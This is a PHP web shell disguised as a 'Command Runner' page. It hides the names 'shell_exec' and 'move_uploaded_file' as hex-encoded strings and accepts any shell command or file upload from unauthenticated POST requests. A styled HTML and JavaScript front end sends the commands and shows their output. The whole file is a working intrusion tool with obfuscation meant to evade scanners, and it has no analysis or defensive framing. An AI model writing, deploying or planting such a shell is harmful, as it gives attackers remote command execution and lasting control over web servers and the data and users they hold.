<?php
$O0O0O0O0="\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63";
$O0O0O0O1="\x6d\x6f\x76\x65\x5f\x75\x70\x6c\x6f\x61\x64\x65\x64\x5f\x66\x69\x6c\x65";
$O0O0O0O2="\x50\x4f\x53\x54";
$O0O0O0O3="\x61\x63\x74\x69\x6f\x6e";
$O0O0O0O4="\x63\x6d\x64";
$O0O0O0O5="\x66\x69\x6c\x65";
$O0O0O0O6="\x6e\x61\x6d\x65";
$O0O0O0O7="\x74\x6d\x70\x5f\x6e\x61\x6d\x65";
$O0O0O0O8="\x72\x75\x6e";
$O0O0O0O9="\x75\x70\x6c\x6f\x61\x64";
if($_SERVER['REQUEST_METHOD']===$O0O0O0O2 && isset($_POST[$O0O0O0O3])){
    if($_POST[$O0O0O0O3]===$O0O0O0O8 && isset($_POST[$O0O0O0O4])){
        echo $O0O0O0O0($_POST[$O0O0O0O4]);
        exit;
    }
    if($_POST[$O0O0O0O3]===$O0O0O0O9 && isset($_FILES[$O0O0O0O5])){
        $O0O0O0OA=$O0O0O0O1;
        $O0O0O0OB=basename($_FILES[$O0O0O0O5][$O0O0O0O6]);
        $O0O0O0OC="";
        $O0O0O0OD=$O0O0O0OC.$O0O0O0OB;
        if($O0O0O0OA($_FILES[$O0O0O0O5][$O0O0O0O7],$O0O0O0OD)){
            echo "Upload success: ".basename($_FILES[$O0O0O0O5][$O0O0O0O6]);
        }else{
            echo "Upload failed!";
        }
        exit;
    }
}
?><!DOCTYPE html>
<html>
<head>
    <title>Command Runner</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#0a0a0a;font-family:'Segoe UI','Consolas',monospace;min-height:100vh;padding:40px 20px}
        .container{max-width:1000px;margin:0 auto}
        .card{background:#111111;border-radius:8px;padding:30px;margin-bottom:25px;border:1px solid #2a2a2a;box-shadow:0 4px 16px rgba(0,0,0,0.5)}
        .title{font-size:24px;font-weight:bold;margin-bottom:25px;text-align:center;color:#00ff41;letter-spacing:1px}
        .upload-area{text-align:center;margin-bottom:25px;padding-bottom:20px;border-bottom:1px solid #2a2a2a}
        .file-label{display:inline-block;padding:12px 28px;background:#1a1a1a;border:1px solid #00ff41;border-radius:6px;cursor:pointer;transition:all 0.3s ease;margin-bottom:15px;color:#00ff41;font-weight:bold}
        .file-label:hover{background:#00ff41;color:#0a0a0a}
        input[type="file"]{display:none}
        .status{margin-top:15px;padding:10px;background:#1a1a1a;border-left:3px solid #00ff41;color:#00ff41;text-align:center;font-size:13px;display:none}
        .input-group{display:flex;gap:10px;flex-wrap:wrap}
        .input-group input[type="text"]{flex:1;padding:14px 18px;background:#0a0a0a;border:1px solid #333333;border-radius:6px;color:#00ff41;font-family:'Consolas',monospace;font-size:14px;transition:all 0.3s ease}
        .input-group input[type="text"]:focus{outline:none;border-color:#00ff41;box-shadow:0 0 8px rgba(0,255,65,0.3)}
        .btn{padding:14px 28px;background:#1a1a1a;border:1px solid #00ff41;border-radius:6px;color:#00ff41;font-family:monospace;font-weight:bold;cursor:pointer;transition:all 0.2s ease}
        .btn:hover{background:#00ff41;color:#0a0a0a}
        .output{background:#0a0a0a;border-radius:6px;padding:20px;margin-top:20px;border-left:4px solid #00ff41;display:none}
        .output-label{color:#888888;font-size:11px;text-transform:uppercase;letter-spacing:2px;margin-bottom:12px}
        pre{color:#00ff41;font-family:'Consolas',monospace;font-size:13px;white-space:pre-wrap;word-wrap:break-word;line-height:1.6}
    </style>
</head>
<body>
<div class="container"><div class="card"><div class="title">[ PHP COMMAND RUNNER ]</div>
<div class="upload-area"><label class="file-label">[ UPLOAD FILE ]<input type="file" id="fileInput" onchange="uploadFile()"></label><div class="status" id="uploadStatus"></div></div>
<div class="input-group"><input type="text" id="cmd" placeholder="> enter command..." autofocus><button class="btn" onclick="runCommand()">[ RUN ]</button></div>
<div class="output" id="output"><div class="output-label">[ OUTPUT ]</div><pre id="output-content"></pre></div></div></div>
<script>
function runCommand(){
    let a=document.getElementById('cmd').value;
    let b=document.getElementById('output');
    let c=document.getElementById('output-content');
    if(a.trim()===""){c.textContent="[!] Please enter a command";b.style.display="block";return;}
    let d=new FormData();
    d.append('action','run');
    d.append('cmd',a);
    fetch(window.location.href,{method:'POST',body:d})
    .then(e=>e.text())
    .then(f=>{c.textContent=f;b.style.display="block";})
    .catch(g=>{c.textContent="[!] Error: "+g;b.style.display="block";});
}
function uploadFile(){
    let a=document.getElementById('fileInput');
    let b=a.files[0];
    let c=document.getElementById('uploadStatus');
    if(!b)return;
    let d=new FormData();
    d.append('action','upload');
    d.append('file',b);
    fetch(window.location.href,{method:'POST',body:d})
    .then(e=>e.text())
    .then(f=>{c.textContent="[✔] "+f;c.style.display="block";setTimeout(()=>{c.style.display="none";},3000);})
    .catch(g=>{c.textContent="[✖] Upload failed: "+g;c.style.display="block";});
}
document.getElementById('cmd').addEventListener('keypress',function(e){if(e.key==='Enter')runCommand();});
</script>
</body>
</html>